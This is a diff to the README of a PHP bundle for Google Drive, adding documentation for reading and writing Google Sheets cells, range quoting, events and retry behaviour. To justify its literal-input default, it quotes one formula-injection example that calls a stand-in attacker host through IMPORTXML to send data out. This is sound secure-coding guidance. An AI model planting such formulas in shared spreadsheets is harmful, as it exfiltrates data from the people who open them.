@@ -29,6 +29,7 @@ This bundle implements the second option: file management, folder navigation, sh
 - **Duplicate documents and instantiate templates** — formulas, sheets and formatting come along
 - **Export** to XLSX, CSV, PDF, DOCX and more, streamed straight to the browser
 - **Import** an `.xlsx`/`.csv`/`.docx` upload and have Google convert it into an editable document
+- **Read and write the cells** of a Google Sheet, so a template can be filled with your own data
 - **Trash and restore** items, browse the trash, or erase for good — accidental deletions stay recoverable
 - **Embed the native Google editor** via the `webViewLink` of each document
 - **Manage sharing**: list, grant and revoke access per file or folder (`reader` / `commenter` / `writer`), for individual users or **Google groups**
@@ -269,6 +270,12 @@ With that in place:
 - entering a **folder** they have access to shows its entire contents;
 - opening or modifying anything else throws `AccessDeniedException` (map it to HTTP 403).
 
+The check is about **reach, not role**: a viewer who holds a `reader` grant on a spreadsheet
+passes it, and the bundle then acts as the service user — which can rename, move, trash and,
+with `SpreadsheetService`, overwrite cells. If your UI has to tell readers from editors, read
+the viewer's role from `listPermissions()` (or your own domain model) before offering a mutating
+action; the bundle does not do that for you yet.
+
 A typical layout is one folder per team or country: share `Portugal` with the Portuguese team and they see that folder and everything inside it — and nothing else.
 
 ### Sharing with groups
@@ -284,6 +291,108 @@ Google does not expose group membership through the Drive API, so the bundle ask
 application instead: return the user's group addresses from `getViewerGroups()` and items
 shared with any of those groups become visible to them.
 
+## Spreadsheet contents
+
+`DriveDocumentService` owns the file — where it lives, who may see it. `SpreadsheetService`
+owns what is inside one, which is the other half of using a Shared Drive as a workspace: take a
+template, fill it with the application's data, hand the user a link to the live editor.
+
+```php
+use Borsche\GoogleDriveDocsBundle\Service\SpreadsheetService;
+
+public function __construct(private readonly SpreadsheetService $sheets) {}
+
+$this->sheets->listTabs($fileId);                    // [['title' => 'Report', 'sheetId' => 0], ...]
+
+$rows = $this->sheets->read($fileId, 'Report!A1:D20');
+$this->sheets->write($fileId, 'Report!A2', $rows);
+$this->sheets->append($fileId, [[$order->getId(), $order->getTotal()]], 'Orders');
+$this->sheets->clear($fileId, 'Report!A2:D');
+
+// One request instead of three, which is what filling a template usually needs
+$this->sheets->writeMany($fileId, [
+    'Report!A1' => [['Report', $period]],
+    'Report!A4' => $bodyRows,
+    'Report!A40' => [['Total', $sum]],
+]);
+$this->sheets->readMany($fileId, ['Report!A1:D1', 'Report!A4:D39']);
+```
+
+It runs on the same authenticated client as the Drive side, so the retry policy and backoff
+apply here too — including to `append()`, which is the one call here that is not idempotent
+(see [Retries](#retries)). Access is not decided separately: every call — reads included —
+asks `DriveDocumentService`, so a spreadsheet's contents are exactly as reachable as the
+spreadsheet itself.
+
+Ranges are developer input. A1 notation is small enough to validate, but the bundle does not:
+`read($id, 'A:ZZ')` happily pulls a whole tab — up to ten million cells — into PHP memory, so
+build ranges from your own constants and the viewer's choices, never from a raw request
+parameter. `readMany()` and `writeMany()` take at most `MAX_BATCH_RANGES` (100) ranges per
+call and refuse more with an `InvalidArgumentException` before asking Google. That ceiling is
+the bundle's, not Google's: `batchGet` carries its ranges in the query string, where a long
+list becomes a URL something in the path may reject unhelpfully, and an unbounded count is
+worth refusing predictably either way.
+
+### Values are stored literally by default
+
+Google can take input two ways, and the bundle defaults to the safe one:
+
+| Mode | `"=SUM(A1:A2)"` becomes | `"007"` becomes |
+|---|---|---|
+| `INPUT_RAW` (default) | that text | `"007"` |
+| `INPUT_AS_TYPED` | a live formula | the number `7` |
+
+```php
+$this->sheets->write($fileId, 'Report!A2', $rows);                                     // literal
+$this->sheets->write($fileId, 'Report!A2', $rows, SpreadsheetService::INPUT_AS_TYPED);  // parsed
+```
+
+**Why the default is `INPUT_RAW`:** under `INPUT_AS_TYPED` any string that happens to start with
+`=` becomes a live formula in a document other people open — Google Sheets' flavour of formula
+injection, and `=IMPORTXML("http://attacker/", …)` is a working exfiltration primitive. Reach for
+`INPUT_AS_TYPED` where the input is yours, not a user's: writing formulas into a template on
+purpose, or letting Google parse dates and numbers you know the shape of. Numbers and dates
+passed as numbers and dates land correctly in either mode — the choice only changes what happens
+to **strings that look like something else**.
+
+### Reading
+
+`read()` and `readMany()` return rows of columns, padded to the width of the widest row, so
+`$rows[2][3]` is always safe to read. That padding matters: Google drops trailing empty cells
+from a row and trailing empty rows from the range, so an unpadded request for `A1:D3` can come
+back as one two-element row.
+
+Pick what the cells should look like with the third argument:
+
+| Render mode | Gives you |
+|---|---|
+| `RENDER_FORMATTED` (default) | what the user sees — separators, currency, formatted dates |
+| `RENDER_RAW` | the underlying values, which is what to use for arithmetic |
+| `RENDER_FORMULA` | the formulas rather than their results |
+
+Cells keep the type Google sends: strings under `RENDER_FORMATTED`, real `int`/`float` and
+`bool` (checkboxes) under `RENDER_RAW` — an unticked box is `false`, never `''`, so it cannot
+be mistaken for an empty cell. Dates under `RENDER_RAW` come as Sheets' serial day number
+(`45658.5` is 2025-01-01 12:00); read them formatted, or convert them yourself.
+
+### Ranges
+
+Tab names are the user's to change, which is why `listTabs()` exists — do not assume `Sheet1`
+is still there. And a name with a space, an apostrophe or a leading digit has to be quoted in A1
+notation, with inner apostrophes doubled — as does a name that reads like a cell: unquoted,
+`Q3` is the cell Q3 of the first tab, and Google silently uses it. `SpreadsheetService::range()`
+gets all of that right:
+
+```php
+SpreadsheetService::range('Orders', 'A1:C10');   // Orders!A1:C10
+SpreadsheetService::range('Q3', 'A1:C10');       // 'Q3'!A1:C10
+SpreadsheetService::range('My Sheet', 'A1');     // 'My Sheet'!A1
+SpreadsheetService::range("Bob's", 'A1');        // 'Bob''s'!A1
+```
+
+Formatting — colours, number formats, conditional rules, adding or removing tabs, frozen rows —
+is Sheets' `spreadsheets.batchUpdate`, which this service does not cover yet.
+
 ## Events
 
 Every write operation dispatches a PSR-14 event, so auditing, notifications or cache
@@ -295,6 +404,9 @@ invalidation live in your application instead of in the bundle:
 | `FolderCreatedEvent` | a folder is created | `folder`, `parentId` |
 | `DocumentCopiedEvent` | a document is duplicated or built from a template | `document`, `sourceId`, `parentId` |
 | `DocumentImportedEvent` | a file is uploaded into the drive | `document`, `originalFilename`, `parentId` |
+| `SheetValuesUpdatedEvent` | cells are overwritten | `range`, `rows` |
+| `SheetRowsAppendedEvent` | rows are appended to a tab | `range`, `rows` |
+| `SheetRangeClearedEvent` | a range is emptied | `range` |
 | `DocumentRenamedEvent` | an item is renamed | `document` |
 | `DocumentMovedEvent` | an item is moved | `document`, `fromParentId`, `toParentId` |
 | `DocumentTrashedEvent` | an item is moved to the trash | `document` |
@@ -585,9 +697,11 @@ surface immediately rather than after three backoff waits.
 One thing the retry policy does not cover: refreshing the OAuth token happens outside Google's
 task runner, so a transient failure there still surfaces directly.
 
-The policy applies to every call, writes included. The Drive API offers no idempotency key, so
-in the rare case where Google completes a `create`, `copy` or `grant` and *then* answers with a
-5xx, the retry performs it a second time — a duplicated document or sharing entry. This is the
+The policy applies to every call, writes included. Neither API offers an idempotency key, so
+in the rare case where Google completes a `create`, `copy`, `grant` or a spreadsheet `append`
+and *then* answers with a 5xx, the retry performs it a second time — a duplicated document,
+sharing entry or row. `append()` is the likeliest to bite: where a duplicate row is
+unacceptable (a ledger, an audit log) `write()` into a range you compute instead. This is the
 same trade-off Google's own client libraries make; if a duplicate is unacceptable in your
 flow, set `retry.attempts: 0` for that call path and handle the failure yourself.
 
